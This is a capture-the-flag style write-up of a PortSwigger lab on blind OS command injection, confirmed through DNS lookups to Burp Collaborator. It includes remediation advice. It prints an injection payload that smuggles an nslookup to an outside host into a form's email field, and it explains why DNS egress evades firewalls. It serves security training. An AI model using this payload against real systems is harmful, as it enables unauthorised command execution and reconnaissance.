# Lab 4: Blind OS command injection with out-of-band interaction

**Category:** OS Command Injection
**Difficulty:** Practitioner
**Lab link:** [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

## Overview

Same injection point as Labs 2/3 (feedback form, `email` param, blind). Instead of timing or file-write, confirm execution via a DNS lookup to Burp Collaborator. `nslookup x.<collab-id>.oastify.com` run on the server generates a DNS query Collaborator logs — attacker-observable proof of blind RCE without any application-layer evidence.

## Key Concepts

- **OAST (Out-of-band Application Security Testing):** the server performs an outbound network request to an attacker-controlled endpoint. The endpoint logs it, proving the server executed the command.
- **Burp Collaborator** = public DNS + HTTP + SMTP endpoint that records all incoming queries per-subdomain. Each lab gets a fresh subdomain via **Insert Collaborator payload**.
- **DNS over HTTP:** `nslookup` is universal, firewalls rarely block outbound DNS, and the lookup leaves a clear record.
- **Fastest blind confirmation method.** No timing baseline, no filesystem discovery — just send and poll.

## Burp Setup

- Proxy → intercept feedback-submit, send to Repeater.
- Open **Collaborator** tab (top menu → Collaborator).

## Solution

### Step 1 — Inject with Collaborator payload

In Repeater, right-click the `email` value → **Insert Collaborator payload**. Modify to:

```
email=x||nslookup+x.YOUR-COLLAB-ID.oastify.com||
```

Full body:
```
csrf=<csrf>&name=x&email=x||nslookup+x.YOUR-COLLAB-ID.oastify.com||&subject=x&message=x
```

Send once.

### Step 2 — Poll Collaborator

Open the Collaborator tab. Click **Poll now**. A DNS interaction row appears:
```
#  Time       Type  Payload
1  14:30:05   DNS   x.abc123.oastify.com
```

That's the lab's back-end running `nslookup`. Lab solved.

## How It Works

1. Feedback endpoint concatenates `email` into shell command → real command fails on `x||...` → `||` fallthrough.
2. Shell runs `nslookup x.<collab-id>.oastify.com`.
3. Server's DNS resolver queries public DNS for the subdomain.
4. Query lands on Collaborator's authoritative DNS server.
5. Collaborator logs the query with timestamp + source IP.
6. Lab's completion checker watches for the DNS lookup; fires on match.

## Why `nslookup` and Not `curl`/`wget`

- **Universally available** on Unix and Windows.
- **DNS egress is almost always open** — firewalls block HTTP freely but DNS is usually whitelisted to `8.8.8.8` or similar.
- **This lab's firewall specifically blocks outbound HTTP** to arbitrary hosts. Only DNS to Collaborator works.
- **Lightweight evidence** — one DNS query, single row in Collaborator log, undisputed proof.

## Why Collaborator (and Not an Attacker Domain)

The lab egress firewall blocks arbitrary external hosts. Collaborator's `.oastify.com` is whitelisted for lab usage. Using your own domain fails silently.

In real engagements, use Collaborator or any public OAST endpoint you control (your own DNS server, canarytokens.org, etc.).

## Why `||` Wraps

Same as Labs 2/3 — real email command fails on invalid input, `||` fallthrough triggers our payload. Trailing `||` keeps app logic unaware.

## Why It Worked

- Feedback endpoint concatenates `email` into shell command without escaping.
- Email fails, `||` fallthrough.
- Shell runs `nslookup`, server's resolver makes outbound DNS.
- Collaborator logs the lookup.

## Remediation

- **Exec-with-argv, not shell concatenation** (Lab 1-3 fix).
- **Egress filtering** — block outbound DNS to non-infrastructure servers. Significantly raises the bar for OAST.
- **Monitor outbound DNS** from web processes for unusual query patterns.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/os-command-injection/lab-04-blind-out-of-band/solve.py)

Sends the payload; expects the user to confirm the hit in Collaborator (the DNS log isn't automatable without the Collaborator API).

## Key Takeaways

- **OAST is the fastest blind confirmation.** No timing baseline, no filesystem discovery — send and poll.
- **DNS is the most reliable OAST channel.** Egress firewalls almost always allow it.
- **Collaborator "Insert payload"** is the right workflow in Burp — don't type `.oastify.com` manually.
- **Blind progression:** timing (Lab 2) → file write (Lab 3) → OAST (Lab 4). Each is a tool; use the one that fits the target.
- **`nslookup` is the universal OAST payload.** Works on every Unix/Windows system, no library install required.
